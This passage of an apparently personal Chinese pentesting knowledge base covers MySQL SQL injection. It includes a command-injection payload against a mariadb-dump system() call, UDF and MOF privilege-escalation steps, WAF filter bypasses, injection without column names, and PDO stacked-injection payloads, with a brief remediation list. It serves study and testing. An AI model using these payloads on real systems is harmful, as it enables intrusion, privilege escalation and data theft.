+<span class="token variable">$dump</span><span class="token operator">=</span><span class="token string single-quoted-string">&apos;mariadb-dump &apos;</span><span class="token operator">.</span><span class="token variable">$db</span><span class="token operator">.</span><span class="token string single-quoted-string">&apos; &apos;</span><span class="token operator">.</span><span class="token variable">$t2d</span><span class="token operator">.</span><span class="token string single-quoted-string">&apos; &gt;./log/&apos;</span><span class="token operator">.</span><span class="token variable">$randstr</span><span class="token operator">.</span><span class="token string single-quoted-string">&apos;.log&apos;</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$dump</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>db&#x548C;table&#x90FD;&#x53EF;&#x63A7;&#xFF0C;&#x8FC7;&#x6EE4;&#x4E0D;&#x4E25;&#x8C28;&#xFF0C;&#x5E76;&#x4E14;&#x76F4;&#x63A5;&#x62FC;&#x63A5;&#x5230;&#x547D;&#x4EE4;&#x4E2D;&#xFF0C;&#x9020;&#x6210;RCE</p>
+<p>payload</p>
+<pre class="language-"><code class="lang-http">?db=ctf&amp;table_2_dump=flag2 %0d%0a &#x547D;&#x4EE4;
+</code></pre>
+<h3 id="&#x63D0;&#x6743;">&#x63D0;&#x6743;</h3>
+<p><strong>UDF&#x63D0;&#x6743;</strong></p>
+<blockquote>
+<p>UDF&#xFF08;User Define Function&#xFF09;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#xFF0C;&#x662F;&#x6570;&#x636E;&#x5E93;&#x529F;&#x80FD;&#x7684;&#x4E00;&#x79CD;&#x6269;&#x5C55;&#x3002;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5728; MySQL &#x4E2D;&#x65E0;&#x6CD5;&#x65B9;&#x4FBF;&#x5B9E;&#x73B0;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5176;&#x6DFB;&#x52A0;&#x7684;&#x65B0;&#x51FD;&#x6570;&#x90FD;&#x53EF;&#x4EE5;&#x5728; SQL &#x8BED;&#x53E5;&#x4E2D;&#x8C03;&#x7528;&#xFF0C;&#x5C31;&#x50CF;&#x8C03;&#x7528;&#x672C;&#x673A;&#x51FD;&#x6570; version () &#x7B49;&#x65B9;&#x4FBF;&#x3002;</p>
+</blockquote>
+<p>UDF&#x5236;&#x4F5C;&#xFF1A;<a href="https://www.t00ls.com/thread-46107-1-1.html" target="_blank">Mysql_UDF_BackDoor&#x5F00;&#x53D1;&#x5B9E;&#x8DF5; - &#x7A0B;&#x5E8F;&#x4EE3;&#x7801;&#x5B66;&#x4E60;(Learning Program) - T00ls | &#x4F4E;&#x8C03;&#x6C42;&#x53D1;&#x5C55; - &#x6F5C;&#x5FC3;&#x4E60;&#x5B89;&#x5168;</a></p>
+<p>UDF&#x63D0;&#x6743;&#x6D41;&#x7A0B;</p>
+<p>&#x5DE5;&#x5177;&#xFF1A;<a href="https://github.com/echohun/tools/blob/master/&#x5927;&#x9A6C;/udf.php" target="_blank">tools/&#x5927;&#x9A6C;/udf.php at master &#xB7; echohun/tools (github.com)</a></p>
+<pre class="language-"><code class="lang-bash"><span class="token comment"># &#x627E;&#x5230;mysql&#x7684;&#x63D2;&#x4EF6;&#x76EE;&#x5F55;(&#x5B89;&#x88C5;&#x76EE;&#x5F55;&#x4E0B;&#x7684;lib/plugin/)</span>
+show variables like <span class="token string">&apos;%plugin%&apos;</span><span class="token punctuation">;</span> <span class="token comment"># &#x8FD4;&#x56DE;&#x63D2;&#x4EF6;&#x76EE;&#x5F55;</span>
+<span class="token keyword">select</span> @@basedir<span class="token punctuation">;</span> <span class="token comment"># &#x8FD4;&#x56DE;&#x5B89;&#x88C5;&#x76EE;&#x5F55;</span>
+
+<span class="token comment"># &#x5199;&#x5165;&#x52A8;&#x6001;&#x94FE;&#x63A5;&#x5E93;</span>
+sqlmap&#x5199;&#x5165;
+&#x624B;&#x52A8;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x5199;&#x5165;
+
+<span class="token comment"># &#x521B;&#x5EFA;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x5E76;&#x8C03;&#x7528;&#x547D;&#x4EE4;</span>
+CREATE FUNCTION sys_eval RETURNS STRING SONAME <span class="token string">&apos;udf.dll&apos;</span><span class="token punctuation">;</span> <span class="token comment"># &#x521B;&#x5EFA;sys_eval&#x51FD;&#x6570;</span>
+<span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">&apos;whoami&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># &#x6267;&#x884C;whoami&#x547D;&#x4EE4;</span>
+
+<span class="token comment"># &#x5220;&#x9664;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;</span>
+drop <span class="token keyword">function</span> sys_eval<span class="token punctuation">;</span>
+</code></pre>
+<p><strong>MOF&#x63D0;&#x6743;</strong></p>
+<ul>
+<li>Windows Server 2003 </li>
+<li>C:/Windows/system32/wbem/mof/ &#x76EE;&#x5F55;&#x4E0B;&#x7684; mof &#x6587;&#x4EF6;&#x6BCF; &#x9694;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF08;&#x51E0;&#x79D2;&#x949F;&#x5DE6;&#x53F3;&#xFF09;&#x90FD;&#x4F1A;&#x88AB;&#x7CFB;&#x7EDF;&#x6267;&#x884C;</li>
+</ul>
+<h1 id="mysql&#x7ED5;&#x8FC7;&#x8865;&#x5145;">Mysql&#x7ED5;&#x8FC7;&#x8865;&#x5145;</h1>
+<h3 id="&#x901A;&#x7528;&#x7ED5;&#x8FC7;">&#x901A;&#x7528;&#x7ED5;&#x8FC7;</h3>
+<ul>
+<li><p>&#x5927;&#x5C0F;&#x5199;&#x7ED5;&#x8FC7;</p>
+<p>&#x4FEE;&#x590D;&#xFF1A;&#x6B63;&#x5219;<code>/i</code></p>
+</li>
+<li><p>&#x53CC;&#x5199;&#x7ED5;&#x8FC7;&#xFF08;waf&#x5C06;&#x5173;&#x952E;&#x5B57;&#x66FF;&#x6362;&#x4E3A;&#x7A7A;&#xFF0C;&#x4E14;&#x6B21;&#x6570;&#x4E3A;1&#xFF09;</p>
+<pre class="language-"><code class="lang-mysql">uniunionon
+</code></pre>
+<p>&#x4FEE;&#x590D;&#xFF1A;&#x6B63;&#x5219;<code>/m</code></p>
+</li>
+</ul>
+<h3 id="&#x6CE8;&#x91CA;&#x7B26;&#x7ED5;&#x8FC7;">&#x6CE8;&#x91CA;&#x7B26;&#x7ED5;&#x8FC7;</h3>
+<pre class="language-"><code class="lang-mysql"># &#x624B;&#x52A8;&#x95ED;&#x5408;
+$sql=&quot;select * from users where id=&apos;$id&apos;;&quot;
+
+$id=1&apos; and &apos;1&apos;=&apos;2
+
+select * from users where id=&apos;1&apos; and &apos;1&apos;=&apos;2&apos;;
+</code></pre>
+<h3 id="&#x7A7A;&#x683C;&#x7ED5;&#x8FC7;">&#x7A7A;&#x683C;&#x7ED5;&#x8FC7;</h3>
+<ul>
+<li><p><code>%0a</code></p>
+</li>
+<li><p><code>%0d%0a</code></p>
+</li>
+<li><p><code>/**/</code></p>
+</li>
+<li><p>&#x62EC;&#x53F7;&#x7ED5;&#x8FC7;</p>
+<blockquote>
+<p>&#x5728;MySQL&#x4E2D;&#xFF0C;&#x62EC;&#x53F7;&#x662F;&#x7528;&#x6765;&#x5305;&#x56F4;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#x8BA1;&#x7B97;&#x51FA;&#x7ED3;&#x679C;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x90FD;&#x53EF;&#x4EE5;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x56F4;&#x8D77;&#x6765;&#x3002;&#x800C;&#x62EC;&#x53F7;&#x7684;&#x4E24;&#x7AEF;&#xFF0C;&#x53EF;&#x4EE5;&#x6CA1;&#x6709;&#x591A;&#x4F59;&#x7684;&#x7A7A;&#x683C;&#x3002;</p>
+</blockquote>
+<p><img src="../../../../images/image-20230522161003063.png" alt="image-20230522161003063"></p>
+</li>
+</ul>
+<h3 id="&#x5F15;&#x53F7;&#x7ED5;&#x8FC7;">&#x5F15;&#x53F7;&#x7ED5;&#x8FC7;</h3>
+<h4 id="&#x4E0D;&#x8BA9;&#x7528;&#x5355;&#x5F15;&#x53F7;">&#x4E0D;&#x8BA9;&#x7528;&#x5355;&#x5F15;&#x53F7;</h4>
+<p>&#x53EF;&#x4EE5;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x4EE3;&#x66FF;</p>
+<pre class="language-"><code class="lang-mysql">where(table_name=&apos;users&apos;) &#x2192; where(table_name=0x7573657273)
+</code></pre>
+<p><img src="../../../../images/image-20230522163358530.png" alt="image-20230522163358530"></p>
+<h4 id="&#x8F6C;&#x4E49;&#x4E86;&#x5355;&#x5F15;&#x53F7;">&#x8F6C;&#x4E49;&#x4E86;&#x5355;&#x5F15;&#x53F7;</h4>
+<p>&#x5BBD;&#x5B57;&#x8282;&#x6CE8;&#x5165;&#xFF0C;&#x4E8C;&#x6B21;&#x6CE8;&#x5165;</p>
+<h3 id="&#x5B57;&#x7B26;&#x4E32;&#x8FDE;&#x63A5;&#x51FD;&#x6570;">&#x5B57;&#x7B26;&#x4E32;&#x8FDE;&#x63A5;&#x51FD;&#x6570;</h3>
+<pre class="language-"><code class="lang-mysql">concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)
+
+concat_ws(&quot;,&quot; , &quot;str1&quot; , &quot;str2&quot;)
+
+group_concat(&quot;str1&quot;, &quot;,&quot; ,&quot;str2&quot;)
+</code></pre>
+<h3 id="select&#x7ED5;&#x8FC7;">select&#x7ED5;&#x8FC7;</h3>
+<ul>
+<li>&#x5DF2;&#x77E5;&#x8868;&#x540D;&#x53EF;&#x4EE5;&#x7528;<code>handle</code></li>
+</ul>
+<ul>
+<li><p>&#x7248;&#x672C;&gt;=8.0</p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/118726022" target="_blank">mysql 8.0.21&#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x7684;&#x65B0;&#x7279;&#x6027;</a></p>
+</li>
+<li><p>&#x5728;&#x5BF9;&#x5F53;&#x524D;&#x8868;&#x7684;&#x5217;&#x540D;&#x6CE8;&#x5165;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x6BB5;&#x540D;&#xFF0C;&#x800C;&#x65E0;&#x9700;<code>select &#x8BE5;&#x5B57;&#x6BB5; from &#x8BE5;&#x8868;</code></p>
+<p><img src="../../../../images/image-20230522161753632.png" alt="image-20230522161753632"></p>
+</li>
+</ul>
+<h3 id="&#x9017;&#x53F7;&#x7ED5;&#x8FC7;">&#x9017;&#x53F7;&#x7ED5;&#x8FC7;</h3>
+<pre class="language-"><code class="lang-mysql">substr(databse(),1,1) &#x7B49;&#x4EF7;&#x4E8E; substr(databse() from 1 for 1)
+</code></pre>
+<pre class="language-"><code class="lang-mysql">select 1,2,3; &#x7B49;&#x4EF7;&#x4E8E; select * from (select 1)a join (select 2)b join (select 3)c;
+</code></pre>
+<p><img src="../../../../images/image-20220718092241142.png" alt="image-20220718092241142"></p>
+<h3 id="&#x5185;&#x8054;&#x6CE8;&#x91CA;">&#x5185;&#x8054;&#x6CE8;&#x91CA;</h3>
+<pre class="language-"><code class="lang-mysql"># &#x5982;&#x679C;&#x52A0;&#x4E86;!&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x5728;/* */&#x5185;&#x7684;&#x8BED;&#x53E5;
+/*!union select 1,2*/
+
+# &#x8981;&#x5C06;&#x6574;&#x4E2A;&#x8BED;&#x53E5;&#x5199;&#x5165;/* */&#x5185;
+/*!union select */1,2 &#x8FD9;&#x662F;&#x9519;&#x8BEF;&#x7684;
+
+
+#  version 5.7.26
+/*!00000 select 1,2*/;     &#x53EF;&#x4EE5;
+/*!50726 select 1,2*/;  &#x53EF;&#x4EE5;
+/*!50727 select 1,2*/;  &#x4E0D;&#x53EF;&#x4EE5;
+
+00000 &#x5230; 50726&#x4E4B;&#x95F4;&#x662F;&#x53EF;&#x4EE5;&#x7684;
+</code></pre>
+<h3 id="&#x65E0;&#x5217;&#x540D;&#x6CE8;&#x5165;">&#x65E0;&#x5217;&#x540D;&#x6CE8;&#x5165;</h3>
+<h4 id="&#x573A;&#x666F;">&#x573A;&#x666F;</h4>
+<p><code>information_schem</code>&#x88AB;&#x8FC7;&#x6EE4;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x8868;&#x7684;&#x5B57;&#x6BB5;&#x540D;</p>
+<h4 id="&#x89E3;&#x51B3;&#x65B9;&#x6CD5;">&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</h4>
+<p>&#x901A;&#x8FC7;<code>select &#x6570;&#x5B57;</code>&#x5C06;&#x5B57;&#x6BB5;&#x540D;&#x8BBE;&#x7F6E;&#x4E3A;&#x6570;&#x5B57;</p>
+<p><img src="../../../../images/image-20230523141619236.png" alt="image-20230523141619236"></p>
+<p>&#x518D;&#x7528;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x5C06;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#x5B58;&#x5230;&#x4E0A;&#x56FE;&#x7684;&#x8868;&#x4E2D;</p>
+<p><img src="../../../../images/image-20230523141701416.png" alt="image-20230523141701416"></p>
+<p>&#x90A3;&#x4E48;&#x60F3;&#x8981;&#x67E5;&#x8BE2;<code>users</code>&#x8868;&#x4E2D;&#x7684;<code>username</code>&#x5B57;&#x6BB5;&#x7684;&#x503C;</p>
+<pre class="language-"><code class="lang-mysql">select `2` from (select 1,2,3 union select * from user)&#x522B;&#x540D;;
+
+# &#x522B;&#x540D;&#x662F;(select 1,2 union select * from user)&#x8FD4;&#x56DE;&#x7684;&#x8868;&#x7684;&#x522B;&#x540D;
+</code></pre>
+<p><img src="../../../../images/image-20230523141936080.png" alt="image-20230523141936080"></p>
+<pre class="language-"><code class="lang-mysql"># &#x5982;&#x679C;&#x53CD;&#x5F15;&#x53F7;&#x88AB;&#x8FC7;&#x6EE4;
+select group_concat(b) from (select 1,2 as b,3 union select * from users)a;
+</code></pre>
+<p><img src="../../../../images/image-20230523142119240.png" alt="image-20230523142119240"></p>
+<h1 id="&#x9884;&#x7F16;&#x8BD1;&#x95EE;&#x9898;">&#x9884;&#x7F16;&#x8BD1;&#x95EE;&#x9898;</h1>
+<h2 id="&#x9884;&#x7F16;&#x8BD1;&#x5931;&#x6548;">&#x9884;&#x7F16;&#x8BD1;&#x5931;&#x6548;</h2>
+<p><code>PHP-PDO</code>&#x91C7;&#x7528;&#x672C;&#x5730;&#x9884;&#x5904;&#x7406;</p>
+<p><img src="../../../../images/image-20230330172825283.png" alt="image-20230330172825283"></p>
+<p>&#x4F20;&#x5165;<code>?username=&apos;admin&apos;</code>,&#x67E5;&#x770B;&#x65E5;&#x5FD7;&#x5982;&#x4E0B;</p>
+<blockquote>
+<p>&#x5F00;&#x542F;&#x6C38;&#x4E45;&#x65E5;&#x5FD7;,&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x52A0;&#x5165;</p>
+<p>general_log = 1
+general_log_file = &#x65E5;&#x5FD7;&#x8DEF;&#x5F84;</p>
+</blockquote>
+<p><img src="../../../../images/image-20230330172741664.png" alt="image-20230330172741664"></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x9884;&#x7F16;&#x8BD1;&#x4E3A;&#x5176;&#x81EA;&#x52A8;&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x5BF9;&#x5F15;&#x53F7;&#xFF0C;&#x5E76;&#x5C06;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x5F15;&#x53F7;&#x8FDB;&#x884C;&#x8F6C;&#x4E49;&#x3002;</p>
+<p>&#x90A3;&#x4E48;&#x5982;&#x679C;&#x5C06;&#x8868;&#x540D;&#xFF0C;<code>order by xx</code>&#x5904;&#x8FDB;&#x884C;&#x9884;&#x7F16;&#x8BD1;&#x5C31;&#x4F1A;&#x4EA7;&#x751F;&#x5982;&#x4E0B;&#x6548;&#x679C;</p>
+<p><img src="../../../../images/image-20230330001720031.png" alt="image-20230330001720031"></p>
+<p><img src="../../../../images/image-20230330001733787.png" alt="image-20230330001733787"></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E9B;&#x8BED;&#x53E5;&quot;&#x5931;&#x6548;&#x4E86;&quot;&#xFF08;&#x6CA1;&#x6709;&#x5F97;&#x5230;&#x60F3;&#x8981;&#x7684;&#x7ED3;&#x679C;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x4E2D;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E9B;&#x8BED;&#x53E5;&#x5927;&#x6982;&#x7387;&#x5C31;&#x662F;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x62FC;&#x63A5;&#x5904;&#x7406;&#xFF0C;&#x5C31;&#x5F88;&#x53EF;&#x80FD;&#x5B58;&#x5728;sql&#x6CE8;&#x5165;&#x3002;</p>
+<h2 id="&#x9884;&#x7F16;&#x8BD1;&#x4F7F;&#x7528;&#x9519;&#x8BEF;">&#x9884;&#x7F16;&#x8BD1;&#x4F7F;&#x7528;&#x9519;&#x8BEF;</h2>
+<ul>
+<li><p><a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank">ThinkPHP5 SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E; &amp;&amp; PDO&#x771F;/&#x4F2A;&#x9884;&#x5904;&#x7406;&#x5206;&#x6790; | &#x79BB;&#x522B;&#x6B4C;</a></p>
+</li>
+<li><p>&#x5806;&#x53E0;&#x6CE8;&#x5165;</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$id</span><span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;id&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment"># &#x9884;&#x5904;&#x7406;&#x8BED;&#x53E5;</span>
+<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;select * from users where id=<span class="token interpolation"><span class="token variable">$id</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fraction</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$fraction</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>&#x4F7F;&#x7528;&#x6A21;&#x62DF;&#x9884;&#x7F16;&#x8BD1;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x7ED1;&#x5B9A;&#x53C2;&#x6570;</p>
+<p>&#x53C8;&#x56E0;&#x4E3A;PDO&#x9ED8;&#x8BA4;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x6761;SQL&#x6267;&#x884C;&#xFF0C;&#x6240;&#x6709;&#x9020;&#x6210;&#x4E86;&#x5806;&#x53E0;&#x6CE8;&#x5165;&#x3002;</p>
+</li>
+</ul>
+<pre class="language-"><code class="lang-mysql">  ?id=1;create database pdo;
+</code></pre>
+<p>  <img src="../../../../images/image-20230523131701820.png" alt="image-20230523131701820"></p>
+<h1 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;">&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h1>
+<ul>
+<li><p>&#x6B63;&#x786E;&#x4F7F;&#x7528;&#x9884;&#x7F16;&#x8BD1;+&#x9ED1;&#x540D;&#x5355;</p>
+</li>
+<li><p>&#x914D;&#x7F6E;&#x95EE;&#x9898;</p>
+<pre class="language-"><code>&#x7AD9;&#x5E93;&#x5206;&#x79BB;
+&#x4E0D;&#x5141;&#x8BB8;&#x5916;&#x8FDE;
+&#x6570;&#x636E;&#x5E93;&#x4EE5;&#x4F4E;&#x6743;&#x9650;&#x8FD0;&#x884C;
+&#x4E0D;&#x663E;&#x793A;&#x62A5;&#x9519;
+&#x4E0D;&#x4F7F;&#x7528;&#x591A;&#x8BED;&#x53E5;&#x67E5;&#x8BE2;
+secure_file_priv=NULL
+&#x5B57;&#x7B26;&#x96C6;&#x4FDD;&#x6301;&#x4E00;&#x81F4;
+</code></pre></li>
+</ul>
+<h1 id="&#x53C2;&#x8003;&#x6587;&#x7AE0;">&#x53C2;&#x8003;&#x6587;&#x7AE0;</h1>
+<p><a href="https://www.anquanke.com/post/id/98096" target="_blank">Dnslog&#x5728;SQL&#x6CE8;&#x5165;&#x4E2D;&#x7684;&#x5B9E;&#x6218;-&#x5B89;&#x5168;&#x5BA2; - &#x5B89;&#x5168;&#x8D44;&#x8BAF;&#x5E73;&#x53F0;</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1938545" target="_blank">https://cloud.tencent.com/developer/article/1938545</a></p>
+<p><a href="https://forum.butian.net/share/1559" target="_blank">&#x5947;&#x5B89;&#x4FE1;&#x653B;&#x9632;&#x793E;&#x533A;-SQL&#x6CE8;&#x5165;&amp;&#x9884;&#x7F16;&#x8BD1;</a></p>
+<p><a href="https://xz.aliyun.com/t/3950" target="_blank">PDO&#x573A;&#x666F;&#x4E0B;&#x7684;SQL&#x6CE8;&#x5165;&#x63A2;&#x7A76; - &#x5148;&#x77E5;&#x793E;&#x533A;</a></p>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Khaz 2024 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2024-12-25 23:20:43
+</span></footer>
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                        
+                    </section>
+                    
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+        <a href="Web安全之Mysql基础.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Mysql基础操作">
+            <i class="fa fa-angle-left"></i>
+        </a>
+        
+        
+        
+        
+    </div>
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Sql注入详解--Mysql","date":"2023/6/26 19:52:40","categories":["Web安全"],"tags":["注入漏洞","数据库攻防"],"level":"1.2.2.1.1.2","depth":5,"next":{"title":"Sql Server","level":"1.2.2.1.2","depth":4,"ref":"","articles":[{"title":"Sql注入--MSSQL","level":"1.2.2.1.2.1","depth":5,"path":"01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.md","ref":"01.渗透测试/02.Web安全/01.Sql注入/SqlServer/Web安全之Sqlserver注入.md","articles":[]}]},"previous":{"title":"Mysql基础操作","level":"1.2.2.1.1.1","depth":5,"path":"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.md","ref":"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql基础.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","popup","donate","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy Khaz 2024","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"github":{"url":"https://github.com/"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"popup":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".title",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"Khaz","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Khaz's 知识库","gitbook":"*","description":"个人的部分知识技能","theme-default":{"showLevel":true}},"file":{"path":"01.渗透测试/02.Web安全/01.Sql注入/Mysql/Web安全之Mysql注入.md","mtime":"2024-12-25T15:20:43.326Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2024-12-29T12:32:08.665Z"},"basePath":"../../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../../gitbook/gitbook.js"></script>
+    <script src="../../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
+        
+    
+
+    </body>
+</html>
+
